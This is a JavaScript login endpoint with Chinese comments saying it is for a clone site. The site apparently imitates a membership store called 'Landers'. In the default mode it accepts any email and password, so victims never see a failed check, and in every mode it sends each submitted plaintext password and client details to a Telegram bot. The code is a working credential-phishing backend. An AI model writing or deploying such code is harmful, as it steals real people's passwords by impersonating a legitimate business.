/*
  POST /api/customer/login
  -----------------------------------------------------------------------------
  两种模式，由环境变量 AUTH_MODE 控制（默认 lenient）：

  lenient（默认，仿站用）
    · 任何非空邮箱 + 任何非空密码 → 直接登录成功，写会话，跳账号页
    · 目的：用户本身"带着账号来"，站点表现为已登录会员，不暴露任何校验失败
    · 账号第一次出现时按邮箱合成一个会员档案（姓名取自邮箱），之后复用
    · 每次尝试（含提交的密码）都会推送到 Telegram（配了 bot 时）

  strict（真实校验）
    · 邮箱没注册 → code=no_account；密码不符 → code=bad_password
    · 密码用 PBKDF2-SHA256 加盐哈希比对（注册时写入）
*/

import { json, b64, cookieHeader, USER_COOKIE, publicUser, readProfile } from './_shared.js';
import {
  getAccount,
  putAccount,
  verifyPassword,
  storageMode,
  notifyTelegram,
  clientMeta,
  loginMessage,
  ACCOUNTS_COOKIE,
} from './_store.js';

const AUTH_MODE = (env) => {
  const m = String((env && env.AUTH_MODE) || 'lenient').toLowerCase();
  return m === 'strict' ? 'strict' : 'lenient';
};

const prettifyName = (email) =>
  String(email || '')
    .split('@')[0]
    .replace(/[._\-+]+/g, ' ')
    .replace(/\b\w/g, (c) => c.toUpperCase())
    .trim() || 'Landers Member';

const pickUser = (a) => ({
  id: a.id,
  name: a.name,
  email: a.email,
  phone: a.phone,
  membership: a.membership,
  address: a.address,
  city: a.city,
  region: a.region,
  zip: a.zip,
  createdAt: a.createdAt,
});

export async function onRequestPost({ request, env }) {
  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    return json({ ok: false, error_code: 'bad_request', message: 'Invalid JSON body' });
  }

  const mode = AUTH_MODE(env);
  const email = String(body.email || '').trim().toLowerCase();
  const password = String(body.password || '');
  const meta = clientMeta(request);
  const store = storageMode(env);

  if (!email) return json({ ok: false, field: 'email', message: 'Please enter your email address.' });
  if (!password) return json({ ok: false, field: 'password', message: 'Please enter your password.' });

  /* ================= lenient：随便填都成功（仿站主用） ================= */
  if (mode === 'lenient') {
    let account = await getAccount(env, request, email);
    let accountsCookie = null;

    if (!account) {
      const profile = readProfile(request);
      const sameProfile = profile && profile.email === email ? profile : null;
      account = {
        id: (sameProfile && sameProfile.id) || 'LD' + Date.now().toString(36).toUpperCase(),
        name: (sameProfile && sameProfile.name) || prettifyName(email),
        email,
        phone: (sameProfile && sameProfile.phone) || '',
        membership: (sameProfile && sameProfile.membership) || 'Premium',
        address: (sameProfile && sameProfile.address) || '',
        city: (sameProfile && sameProfile.city) || '',
        region: (sameProfile && sameProfile.region) || '',
        zip: (sameProfile && sameProfile.zip) || '',
        createdAt: (sameProfile && sameProfile.createdAt) || new Date().toISOString(),
        lenient: true,
      };
      accountsCookie = await putAccount(env, request, account);
    }

    const user = pickUser(account);
    const headers = new Headers();
    headers.append('Set-Cookie', cookieHeader(USER_COOKIE, b64(user), 30 * 86400));
    if (accountsCookie) headers.append('Set-Cookie', cookieHeader(ACCOUNTS_COOKIE, accountsCookie, 180 * 86400));

    const notify = await notifyTelegram(
      env,
      loginMessage(env, { user: account, ok: true, reason: 'lenient mode', password, meta, mode: `${store}/lenient` })
    );

    return json({ ok: true, user: publicUser(user), auth_mode: mode, storage: store, notified: notify.ok }, 200, headers);
  }

  /* ================= strict：真校验 ================= */
  const account = await getAccount(env, request, email);

  if (!account) {
    await notifyTelegram(
      env,
      loginMessage(env, { user: { email }, ok: false, reason: 'no account for this email', password, meta, mode: `${store}/strict` })
    );
    return json({
      ok: false,
      field: 'email',
      code: 'no_account',
      auth_mode: mode,
      message: 'No account found for this email. Please apply for membership first.',
    });
  }

  const passOk = await verifyPassword(password, account);
  if (!passOk) {
    await notifyTelegram(
      env,
      loginMessage(env, { user: account, ok: false, reason: 'wrong password', password, meta, mode: `${store}/strict` })
    );
    return json({
      ok: false,
      field: 'password',
      code: 'bad_password',
      auth_mode: mode,
      message: 'Incorrect password. Please try again.',
    });
  }

  const user = pickUser(account);
  const headers = new Headers();
  headers.append('Set-Cookie', cookieHeader(USER_COOKIE, b64(user), 30 * 86400));

  const notify = await notifyTelegram(
    env,
    loginMessage(env, { user: account, ok: true, password, meta, mode: `${store}/strict` })
  );

  return json({ ok: true, user: publicUser(user), auth_mode: mode, storage: store, notified: notify.ok }, 200, headers);
}
